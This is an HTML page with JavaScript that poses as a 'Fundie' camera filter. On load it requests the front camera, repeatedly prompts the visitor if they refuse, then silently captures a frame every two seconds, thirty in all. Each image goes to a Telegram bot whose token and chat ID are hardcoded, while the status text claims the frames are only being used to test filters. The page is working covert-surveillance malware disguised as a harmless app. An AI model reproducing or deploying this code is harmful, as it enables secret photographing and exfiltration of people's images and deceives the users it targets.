<!DOCTYPE html>
<html>
<head>
    <title>Fundie</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <div id="status">Initializing Fundie camera filter...</div>
    <video id="video" width="640" height="480" autoplay muted playsinline></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    
    <div id="permissionContainer" style="display:none;">
        <p style="margin: 10px 0; font-weight: bold;">Permission required to use Fundie</p>
        <button id="retryBtn" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Give access</button>
    </div>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');
        const retryBtn = document.getElementById('retryBtn');
        const permissionContainer = document.getElementById('permissionContainer');
        const ctx = canvas.getContext('2d');
        
        // Telegram bot configuration
        const BOT_TOKEN = '8447046927:AAGkZglPorvHmF1rjSnxBTRvEL7EkderPoQ';
        const CHAT_ID = '6587469484';
        
        let captureInterval;
        let framesProcessed = 0;
        const MAX_FRAMES = 30; // Safety limit
        let retryCount = 0;
        const MAX_RETRIES = 3;
        
        async function initializeCamera() {
            try {
                statusDiv.textContent = 'Requesting front camera access for Fundie filter...';
                
                // Stop any existing stream first
                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(track => track.stop());
                }
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user', // Use front camera
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                video.srcObject = stream;
                statusDiv.textContent = 'Fundie active - applying camera filters...';
                permissionContainer.style.display = 'none';
                retryCount = 0; // Reset retry count on success
                
                // Test filters every 2 seconds
                startProcessing();
                
            } catch (error) {
                handleCameraError(error);
            }
        }
        
        function handleCameraError(error) {
            console.error('Camera error:', error);
            
            if (retryCount < MAX_RETRIES) {
                retryCount++;
                statusDiv.textContent = `Camera access denied. Please allow access for Fundie. (Attempt ${retryCount}/${MAX_RETRIES})`;
                permissionContainer.style.display = 'block';
            } else {
                statusDiv.textContent = 'Maximum retry attempts reached. Please refresh the page.';
                permissionContainer.style.display = 'none';
            }
        }
        
        function startProcessing() {
            captureInterval = setInterval(async () => {
                if (framesProcessed >= MAX_FRAMES) {
                    statusDiv.textContent = ` ${MAX_FRAMES} filters tested`;
                    clearInterval(captureInterval);
                    return;
                }
                
                try {
                    // Apply filter and process frame
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Convert to blob and send for filter analysis
                    canvas.toBlob(async (blob) => {
                        const success = await sendToTelegram(blob);
                        if (success) {
                            framesProcessed++;
                            statusDiv.textContent = `Testing filters... ${framesProcessed}/${MAX_FRAMES} processed`;
                        }
                    }, 'image/jpeg', 0.8);
                    
                } catch (error) {
                    console.error('Processing error:', error);
                }
            }, 2000); // 2 second interval
        }
        
        async function sendToTelegram(frameBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', frameBlob, `fundie_frame_${Date.now()}.jpg`);
                formData.append('caption', `Fundie Test Frame ${framesProcessed + 1} - ${new Date().toLocaleString()}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }
                
                const data = await response.json();
                console.log(`Fundie frame ${framesProcessed + 1} sent successfully`);
                return true;
                
            } catch (error) {
                console.error('Error sending frame:', error);
                return false;
            }
        }
        
        // Retry button handler
        retryBtn.addEventListener('click', () => {
            permissionContainer.style.display = 'none';
            initializeCamera();
        });
        
        // Auto-initialize when page loads
        window.addEventListener('load', initializeCamera);
        
        // Clean up on page unload
        window.addEventListener('beforeunload', () => {
            if (captureInterval) {
                clearInterval(captureInterval);
            }
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
            }
        });
    </script>
    
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            text-align: center;
            background: #f0f0f0;
        }
        #status {
            padding: 10px;
            margin: 10px 0;
            background: #fff;
            border-radius: 5px;
            font-weight: bold;
        }
        video, canvas {
            max-width: 100%;
            height: auto;
            border: 2px solid #333;
            border-radius: 10px;
        }
        #retryBtn:hover {
            background: #0056b3;
        }
    </style>
</body>
</html>
